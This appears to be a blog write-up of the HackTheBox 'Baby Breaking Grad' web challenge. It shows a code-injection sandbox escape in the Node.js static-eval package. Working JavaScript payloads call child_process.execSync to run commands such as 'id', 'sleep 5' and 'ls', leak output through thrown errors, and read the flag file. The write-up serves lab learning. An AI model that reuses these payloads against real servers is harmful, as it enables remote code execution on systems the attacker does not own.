---
title: Baby Breaking Grad
date: 2024-11-07 14:30:45 +0100
categories: [hackTheBox, web]
tags: [challenge]
---


# HackTheBox - Baby Breaking Grad Web Challenge

**Link:** [HackTheBox Challenge - Baby Breaking Grad](https://app.hackthebox.com/challenges/baby%20breaking%20grad)

### Challenge Description
We corrected the math in our physics teacher's paper, and now he is failing us out of spite for embarrassing him at the university's research symposium. Now, we can't graduate unless we can do something about it...

### Walkthrough

![img-description](assets/img/screenshots/Pasted image 20241106235150.png)

Upon visiting the website, we are greeted with this page. Clicking the "Did I pass?" button results in "No" message for both students. Let’s open Burp Suite and see what’s going on more closely.

![[Pasted image 20241106235506.png]] 

We can see that the student's name is sent to the server, and the server responds with "Nope." Our request is sent to the `/api/calculate` endpoint, suggesting that some calculations are happening in the backend to check if we passed. So let's inspect the source code.

![[Pasted image 20241107000231.png]]

While inspecting `index.js`, we notice a few things:

1. At line 20, the formula can have different values.
2. At line 22, there is a blacklist of students.

Let's investigate the `StudentHelper.js` file, to see exactly what's going on.

![[Pasted image 20241107000859.png]]

From this code, we observe that:

1. The `static-eval` package is used.
2. Students "Baker" and "Purvirs" are blacklisted.
3. If a student is not blacklisted, it uses `evaluate` to parse the formula.

Before exploring a code injection vulnerability in `static-eval`, let’s test our understanding of the code by trying to get a passing grade. We know it expects the following parameters `exam`, `paper`, and `assignment`.

![[Pasted image 20241107003215.png]]

We start with these really bad grades, and as expected, we fail.

![[Pasted image 20241107003547.png]]

After modifying the formula to add ten points to the exam grade, we pass!

Now that we understand the calculation process, let's delve deeper into `static-eval` to find a command injection vulnerability that we could exploit when the server parses our formula.

![[Pasted image 20241107003826.png]]

While examining its [repository](https://github.com/browserify/static-eval/blob/master/test/eval.js), I noticed this interesting line of code. If we can execute the right function, we might achieve code execution.

After further research, I found this [post](https://licenciaparahackear.github.io/posts/static-eval-sandbox-escape-original-writeup/), which shows how to achieve our goal with the following code:
```javascript
(function({x}){return x.constructor})({x:"".sub})("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()
```

We will merge this payload with previous code from the repo to create a new payload. Using the `sleep` command to check if our injection was successful:
```javascript
(function myTag(y){return ''[!y?'__proto__':'constructor'][y]})('constructor')('console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"sleep 5\").toString())')()
```

> **Note:** Replace double quotes with single quotes, as shown above.

![[Pasted image 20241107005813.png]]

We send our request, and we observe a five-second delay, confirming our code was executed successfully. Now, we need to retrieve the output of our code.

After more research, I found that we could extract the output through error messages using `throw new Error()`.

> In JavaScript, `throw new Error()` is a way to create and throw an error. `throw` keyword is used to throw or raise an exception. It can then be followed by any JavaScript expression, in our case we are creating a new instance of the `Error` class, a built-in JavaScript object for handling errors.

By replacing `console.log` with `throw new Error()`, it should work as intended.

```javascript
(function myTag(y){return ''[!y?'__proto__':'constructor'][y]})('constructor')('throw new Error(global.process.mainModule.constructor._load(\"child_process\").execSync(\"ls\").toString())')()
```

Next, we'll run the `ls` command to locate our flag.

![[Pasted image 20241107010918.png]]

And here we go! We see a file named `flagFOJ94`. Now, we just replace the `ls` command with `cat flagFOJ94` to read its contents.

![[Pasted image 20241107011406.png]]

Thank you for reading 📖 
